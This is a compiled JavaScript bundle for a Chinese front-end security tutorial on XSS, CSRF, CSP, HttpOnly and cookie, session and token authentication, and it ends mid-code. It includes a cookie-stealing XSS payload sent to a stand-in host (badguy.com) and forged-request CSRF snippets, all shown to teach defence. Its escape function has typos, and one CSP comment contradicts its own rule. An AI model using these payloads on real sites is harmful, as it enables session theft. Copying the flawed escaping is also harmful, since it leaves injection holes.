(window.webpackJsonp=window.webpackJsonp||[]).push([[16],{245:function(t,s,a){"use strict";a.r(s);var e=a(0),n=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("div",{staticClass:"content"},[t._m(0),t._v(" "),t._m(1),t._v(" "),a("blockquote",[a("p",[a("a",{attrs:{href:"https://www.wikiwand.com/zh/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC",target:"_blank",rel:"noopener noreferrer"}},[a("strong",[t._v("跨网站指令码")]),a("OutboundLink")],1),t._v("（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了 HTML 以及使用者端脚本语言")])]),t._v(" "),a("p",[t._v("XSS 分为三种：反射型，存储型和 DOM-based")]),t._v(" "),t._m(2),t._v(" "),a("p",[t._v("XSS 通过修改 HTML 节点或者执行 JS 代码来攻击网站。这些脚本可以任意读取 cookie，session tokens，或者其它敏感的网站信息，或者让恶意脚本重写html内容。")]),t._v(" "),t._m(3),t._v(" "),a("p",[t._v("例如有这么一个 url，你的网站从链接上获取参数并拼接在 html 中")]),t._v(" "),t._m(4),a("p",[t._v("这样页面中就凭空多了一段可执行脚本。这种攻击类型是反射型攻击，也可以说是 DOM-based 攻击")]),t._v(" "),t._m(5),t._v(" "),t._m(6),t._v(" "),t._m(7),t._v(" "),a("p",[t._v("最普遍的做法是转义输入输出（对表单输入和url参数）的内容，对于引号，尖括号，斜杠进行转义")]),t._v(" "),t._m(8),a("p",[t._v("对于显示富文本来说，不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。这种情况通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。")]),t._v(" "),t._m(9),a("p",[t._v("以上示例使用了 js-xss 来实现。可以看到在输出中保留了 h1 标签且过滤了 script 标签")]),t._v(" "),t._m(10),t._v(" "),t._m(11),t._v(" "),a("p",[t._v("我们可以通过 CSP 来尽量减少 XSS 攻击。CSP 本质上也是建立白名单，规定了浏览器只能够执行特定来源的代码。")]),t._v(" "),a("p",[t._v("通常可以通过 HTTP response Header 中的 Content-Security-Policy 来开启 CSP；举例：")]),t._v(" "),a("ul",[t._m(12),t._v(" "),t._m(13),t._v(" "),t._m(14),t._v(" "),a("li",[t._v("了解更多的配置项"),a("a",{attrs:{href:"https://content-security-policy.com/",target:"_blank",rel:"noopener noreferrer"}},[t._v("看这里"),a("OutboundLink")],1)])]),t._v(" "),t._m(15),t._v(" "),a("p",[t._v("在 cookie 中设置 HttpOnly 属性，那么通过js脚本将无法读取到 cookie 信息，这样在一定程度上的防止 XSS 攻击，"),a("a",{attrs:{href:"https://blog.csdn.net/zzzmmmkkk/article/details/10862949",target:"_blank",rel:"noopener noreferrer"}},[t._v("了解更多参考"),a("OutboundLink")],1)]),t._v(" "),t._m(16),t._v(" "),a("blockquote",[a("p",[a("a",{attrs:{href:"https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html",target:"_blank",rel:"noopener noreferrer"}},[a("strong",[t._v("跨站请求伪造")]),a("OutboundLink")],1),t._v("（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟"),a("a",{attrs:{href:"https://www.wikiwand.com/zh/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC",target:"_blank",rel:"noopener noreferrer"}},[a("strong",[t._v("跨网站指令码(XSS)")]),a("OutboundLink")],1),t._v("相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。")])]),t._v(" "),t._m(17),t._v(" "),a("p",[t._v("假设网站中有一个通过 Get 请求提交用户评论的接口，那么攻击者就可以在钓鱼网站中加入一个图片，图片的地址就是评论接口")]),t._v(" "),t._m(18),a("p",[t._v("如果接口是 Post 提交的，就相对麻烦点，需要用表单来提交接口")]),t._v(" "),t._m(19),t._m(20),t._v(" "),a("p",[t._v("防范 CSRF 可以遵循以下几种规则：")]),t._v(" "),a("ol",[a("li",[t._v("Get 请求不对数据进行修改")]),t._v(" "),a("li",[t._v("不让第三方网站访问到用户 Cookie\n"),a("ul",[a("li",[t._m(21),t._v(" - 可以对 Cookie 设置 SameSite 属性。该属性设置 Cookie 不随着跨域请求发送，该属性可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容。"),a("a",{attrs:{href:"http://www.cnblogs.com/ziyunfei/p/5637945.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("了解更多参考"),a("OutboundLink")],1)])])]),t._v(" "),t._m(22),t._v(" "),a("li",[t._v("请求时附带验证信息，比如验证码或者 token\n"),a("ul",[a("li",[t._v("服务器下发一个随机 Token（算法不能复杂），每次发起请求时将 Token 携带上，服务器验证 Token 是否有效。关于"),a("a",{attrs:{href:"http://ju.outofmemory.cn/entry/134189",target:"_blank",rel:"noopener noreferrer"}},[t._v("了解更多参考"),a("OutboundLink")],1)])])])]),t._v(" "),t._m(23),t._v(" "),a("p",[t._v("在一个个性化的系统中，我们不可避免地需要进行身份/权限认证。典型的场景比如购物车，当你点击下单按钮时，由于 HTTP 协议无状态，所以并不知道是哪个用户操作的，所以需要权限验证。我们"),a("a",{attrs:{href:"https://www.jianshu.com/p/eaf9197abb6b",target:"_blank",rel:"noopener noreferrer"}},[t._v("常用的验证方式有这些"),a("OutboundLink")],1),t._v("。")]),t._v(" "),a("p",[t._v("在讲常用权限验证方式之前，我们先需要明白几个概念：")]),t._v(" "),t._m(24),t._v(" "),a("blockquote",[a("p",[a("a",{attrs:{href:"https://zh.wikipedia.org/wiki/Cookie",target:"_blank",rel:"noopener noreferrer"}},[t._v("cookie"),a("OutboundLink")],1),t._v(" 指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密），是一种数据存储方式。在 http 请求中会附加在请求头中发送出去")])]),t._v(" "),a("p",[t._v("所以我们可以利用 cookie 记录某个用户的标识，或者存储一些必要的数据。")]),t._v(" "),a("p",[t._v("cookie 优缺点")]),t._v(" "),t._m(25),t._v(" "),t._m(26),t._v(" "),a("blockquote",[a("p",[t._v("在计算机科学领域，尤其是在网络领域，"),a("a",{attrs:{href:"https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)",target:"_blank",rel:"noopener noreferrer"}},[t._v("会话（session）"),a("OutboundLink")],1),t._v("是一种持久网络协议，在用户（或用户代理）端和服务器端之间创建关联，从而起到交换数据包的作用机制；在不包含会话层（例如UDP）或者是无法长时间驻留会话层（例如HTTP）的传输协议中，会话的维持需要依靠在传输数据中的高级别程序。例如，在浏览器和远程主机之间的HTTP传输中，HTTP cookie就会被用来包含一些相关的信息，例如session ID，参数和权限信息等。")])]),t._v(" "),a("p",[t._v("所以说，session 本是一个抽象概念，开发者为了实现中断和继续等操作，将 user agent 和 server 之间一对一的交互，抽象为“会话”，进而衍生出“会话状态”，也就是 session 的概念。"),a("a",{attrs:{href:"https://www.zhihu.com/question/19786827",target:"_blank",rel:"noopener noreferrer"}},[t._v("session 和 cookie 的区别可参考"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("而 session 的实现又是另一种概念，具体来说就是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中。通常是这样子的：")]),t._v(" "),t._m(27),t._v(" "),a("p",[a("a",{attrs:{href:"https://zhuanlan.zhihu.com/p/35448410",target:"_blank",rel:"noopener noreferrer"}},[t._v("Session 的特点"),a("OutboundLink")],1),t._v("：")]),t._v(" "),t._m(28),t._v(" "),t._m(29),t._v(" "),a("p",[t._v("了解了 Session，我们再说 Token。Token 在不同的地方含义不一样，比如词法分析中的 Token，这里我们主要说 http 中的 Token 验证。其中一种最著名的方案是"),a("a",{attrs:{href:"https://jwt.io/",target:"_blank",rel:"noopener noreferrer"}},[t._v("JWT"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("Session 验证 和 Token 验证的区别：")]),t._v(" "),a("ul",[a("li",[t._v("一个在于 Session 会存储在服务端，而 Token 只存储在客户端，这样就避免了每次请求需要查询数据库（或者内存）判断用户状态。")]),t._v(" "),a("li",[t._v("也正因为 Token 直接把数据保存在客户端，可以更好的做到"),a("a",{attrs:{href:"https://juejin.im/post/5a002b536fb9a045132a1727",target:"_blank",rel:"noopener noreferrer"}},[t._v("跨域认证"),a("OutboundLink")],1),t._v("的需求。")])]),t._v(" "),a("p",[a("a",{attrs:{href:"http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Token 的特点"),a("OutboundLink")],1),t._v("：")]),t._v(" "),t._m(30),t._v(" "),t._m(31),t._v(" "),a("ul",[a("li",[a("a",{attrs:{href:"https://www.onmpw.com/tm/xwzj/network_145.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("SSO单点登录三种情况"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://juejin.im/post/5a002b536fb9a045132a1727",target:"_blank",rel:"noopener noreferrer"}},[t._v("前端需要了解的 SSO 与 CAS 知识"),a("OutboundLink")],1)]),t._v(" "),a("li",[a("a",{attrs:{href:"https://apereo.github.io/cas/4.2.x/index.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("CAS official website"),a("OutboundLink")],1)])])])}),[function(){var t=this.$createElement,s=this._self._c||t;return s("h1",{attrs:{id:"安全"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#安全"}},[this._v("#")]),this._v(" 安全")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"xss"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#xss"}},[this._v("#")]),this._v(" XSS")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"如何攻击？"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#如何攻击？"}},[this._v("#")]),this._v(" 如何攻击？")])},function(){var t=this.$createElement,s=this._self._c||t;return s("ul",[s("li",[this._v("DOM-based - 被执行的恶意脚本会修改页面脚本结构。")]),this._v(" "),s("li",[this._v("存储型XSS - 注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。")]),this._v(" "),s("li",[this._v("反射型XSS - 当用户点击一个恶意链接，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。")])])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('\x3c!-- http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)<\/script> --\x3e')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("{{term}}"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("div")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("p",[this._v("也有另一种场景，比如写了一篇包含攻击代码"),s("code",[this._v('<script>window.open("http://badguy.com?cookie="+document.cookie)<\/script>')]),this._v("的文章发表，恶意脚本可能会被保存到数据库，那么可能浏览文章的用户都会被攻击到。这种攻击类型是存储型攻击，也可以说是 DOM-based 攻击，并且这种攻击打击面更广。")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"如何防御？"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#如何防御？"}},[this._v("#")]),this._v(" 如何防御？")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h4",{attrs:{id:"_1-特殊字符转义"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-特殊字符转义"}},[this._v("#")]),this._v(" 1. 特殊字符转义")])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("escape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\tstr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/&/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&amp;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\tstr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/</g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&lt;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\tstr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/>/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&gt;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\tstr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v('/"/g')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&quto;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\tstr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/'/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&##39;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\tstr "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/`/g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&##96;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[t._v("/\\//g")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&##x2F;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" str\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" xss "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("require")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"xss"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" html "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("xss")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('\'<h1 id="title">XSS Demo</h1><script>alert("xss");<\/script>\'')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// -> <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt;')]),t._v("\nconsole"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("html"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" \n")])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h4",{attrs:{id:"_2-csp"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-csp"}},[this._v("#")]),this._v(" 2. CSP")])},function(){var t=this.$createElement,s=this._self._c||t;return s("blockquote",[s("p",[this._v("内容安全策略 (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。")])])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("li",[t._v("只允许加载本站资源"),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("Content"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("default")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src ‘self’\n")])])])])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("li",[t._v("只允许加载 HTTPS 协议图片"),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("Content"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" img"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src https"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("/*\n")])])])])])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("li",[t._v("允许加载任何来源框架"),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("Content"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Security"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Policy"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" child"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'none'")]),t._v("\n")])])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h4",{attrs:{id:"_3-httponly"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_3-httponly"}},[this._v("#")]),this._v(" 3. HttpOnly")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"csrf"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#csrf"}},[this._v("#")]),this._v(" CSRF")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"如何攻击？-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#如何攻击？-2"}},[this._v("#")]),this._v(" 如何攻击？")])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://www.domain.com/xxx?comment='attack'"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("/>")])]),t._v("\n")])])])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("div",{staticClass:"language-html extra-class"},[a("pre",{pre:!0,attrs:{class:"language-html"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("action")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("http://www.domain.com/xxx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("CSRF"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("method")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("comment"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("attack"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),a("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),a("span",{pre:!0,attrs:{class:"token attr-value"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"如何防御？-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#如何防御？-2"}},[this._v("#")]),this._v(" 如何防御？")])},function(){var t=this.$createElement,s=this._self._c||t;return s("a",{attrs:{href:""}},[s("strong",[this._v("SameSite")])])},function(){var t=this.$createElement,s=this._self._c||t;return s("li",[this._v("阻止第三方网站请求接口\n"),s("ul",[s("li",[s("strong",[this._v("验证 Referer")]),this._v(" - 对于需要防范 CSRF 的请求，我们可以通过验证 Referer 来判断该请求是否为第三方网站发起的。")])])])},function(){var t=this.$createElement,s=this._self._c||t;return s("h2",{attrs:{id:"权限验证"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#权限验证"}},[this._v("#")]),this._v(" 权限验证")])},function(){var t=this.$createElement,s=this._self._c||t;return s("h3",{attrs:{id:"cookie"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#cookie"}},[this._v("#")]),this._v(" Cookie")])},function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ul",[a("li",[t._v("服务端可以通过 Set-Cookie 相应头在客户端设置 cookie")]),t._v(" "),a("li",[t._v("cookie 会随 http 请求一同发出去（可能会影响性能）")]),t._v(" "),a("li",[t._v("cookie 可以设置额外信息"),a("div",{staticClass:"language-js extra-class"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[t._v("Expires 过期日期\nMax"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("age 存活时间\nDomain 对应的域"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" 可以设置以供多个同域名主机共享cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" 或限制cookie可使用的域\nPath 控制哪些路径的页面可以访问cookie\nSecure 可以http传输或只能https"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" 防中间人攻击\nHttpOnly 设置以禁用js的Document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookieAPI"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" 防"),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("XSS")]),t._v("\nsame"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("site\t规定浏览器不能在跨域请求中携带 Cookie，减少 "),a("span",{pre:!0,attrs:{class:"token 